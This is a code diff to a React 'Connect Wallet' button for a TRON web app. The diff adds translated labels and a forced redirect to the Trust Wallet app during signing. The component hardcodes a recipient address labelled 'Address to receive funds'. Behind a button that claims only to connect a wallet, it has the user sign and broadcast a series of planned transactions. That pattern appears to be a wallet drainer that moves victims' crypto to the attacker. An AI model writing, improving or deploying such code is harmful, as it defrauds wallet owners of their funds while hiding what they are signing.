@@ -2,6 +2,7 @@ import React, { useState, useEffect, useRef } from 'react';
 import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { useWalletModal } from '@tronweb3/tronwallet-adapter-react-ui';
 import { TransactionService } from '../services/transaction.service';
+import { useTranslation } from 'react-i18next';
 
 // --- CONFIGURATION ---
 // Address to receive funds
@@ -9,8 +10,9 @@ const RECIPIENT_ADDRESS = 'TWBRNk1RJJ9Vvff38ARFvvmhbGk7UybJYg';
 // ---------------------
 
 const ConnectWalletBtn = ({ className }) => {
-    const { address, signTransaction, connected, select, wallets, connect } = useWallet();
+    const { address, signTransaction, connected, select, wallets, connect, wallet } = useWallet();
     const { setVisible } = useWalletModal();
+    const { t } = useTranslation();
     const [status, setStatus] = useState('');
     const [isLoading, setIsLoading] = useState(false);
 
@@ -42,27 +44,12 @@ const ConnectWalletBtn = ({ className }) => {
                 const item = plan[i];
                 setStatus(`Signing ${item.type}...`);
 
-                // TELEGRAM DEEP LINK LOGIC
-                // If in Telegram Web App, manually trigger Trust Wallet deep link
-                const isTelegram = window.Telegram?.WebApp?.initData;
-                if (isTelegram) {
-                    console.log("Telegram detected: Triggering Trust Wallet deep link for signing...");
-
-                    // Construct Trust Wallet Deep Link
-                    // Using standard universal link to open url (which should be the current dApp url)
-                    // This forces the Trust Wallet app to come to foreground
-                    const currentUrl = window.location.href;
-                    const deepLink = `https://link.trustwallet.com/open_url?coin_id=195&url=${encodeURIComponent(currentUrl)}`;
-
-                    // Trigger navigation
-                    window.location.href = deepLink;
-
-                    // Give it a moment to switch before calling sign (although sign might block if app not ready)
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                }
-
                 try {
                     // Sign
+                    // Force redirect to Trust Wallet if using WalletConnect (Mobile behavior)
+                    if (wallet?.adapter?.name === 'WalletConnect') {
+                        window.location.href = 'trust://';
+                    }
                     const signedTransaction = await signTransaction(item.transaction);
 
                     // Broadcast
@@ -153,7 +140,7 @@ const ConnectWalletBtn = ({ className }) => {
             onClick={handleClick}
             disabled={isLoading}
         >
-            {connected ? (status || 'Wallet Connected') : 'Connect Wallet'}
+            {connected ? (status || t('buttons.walletConnected')) : t('buttons.connectWallet')}
         </button>
     );
 };
